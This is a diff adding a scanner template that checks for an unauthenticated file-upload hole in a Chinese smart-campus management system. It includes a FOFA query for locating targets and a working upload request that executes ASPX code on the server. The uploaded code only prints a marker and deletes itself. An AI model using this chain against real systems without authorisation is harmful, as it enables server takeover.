@@ -1,0 +1,41 @@
+id: anxiaoyi-FileUpAd_aspx-file-upload
+
+info:
+  name: 智慧校园(安校易)管理系统 FileUpAd.aspx  任意文件上传漏洞
+  author: Superhero
+  severity: high
+  description: |-
+    fofa: title="智慧综合管理平台登入"
+    智慧校园(安校易)管理系统 FileUpAd.aspx  接口处存在任意文件上传漏洞，未经身份验证的攻击者通过漏洞上传恶意后门文件，执行任意代码，从而获取到服务器权限。
+  reference:
+    - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247486389&idx=1&sn=fd96450f237dcadbf4a40028de9c2e31&chksm=c267be86f510379093007b234a9e61520b86f868d706fc49893dca5efebfe4aa32b04f5a1211&token=1628549949&lang=zh_CN#rd
+  tags: File upload
+  
+http:
+  - raw:
+      - |
+        POST /Module/FileUpPage/FileUpAd.aspx?file_tmid=upload HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
+        X-Requested-With: XMLHttpRequest
+        Content-Type: multipart/form-data; boundary=----21909179191068471382830692394
+
+        ------21909179191068471382830692394
+        Content-Disposition: form-data; name="File"; filename="test.aspx"
+        Content-Type: image/jpeg
+
+        <%@Page Language="C#"%><%Response.Write("pboyjnnrfipmplsukdeczudsefxmywe");System.IO.File.Delete(Request.PhysicalPath);%>
+        ------21909179191068471382830692394--
+  - raw:
+      - |
+        GET /imgnews/imgad/000000/upload.aspx HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'pboyjnnrfipmplsukdeczudsefxmywe'
+      - type: status
+        status: 
+          - 200
